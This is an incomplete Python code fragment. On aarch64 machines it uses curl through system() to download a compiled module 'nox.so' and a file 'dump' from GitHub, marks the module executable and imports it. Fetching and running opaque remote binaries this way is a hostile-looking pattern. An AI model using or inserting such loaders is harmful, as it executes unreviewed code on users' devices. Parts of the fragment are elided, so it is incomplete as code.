...
if machine()=='aarch64':
    ...
    system('curl -L https://github.com/Nox-Naved/.../raw/main/nox.so -o nox.so')
    system('curl -L https://github.com/Nox-Naved/D-FILE/blob/main/dump?raw=true -o dump;chmod +x nox.so')
    import nox
else:
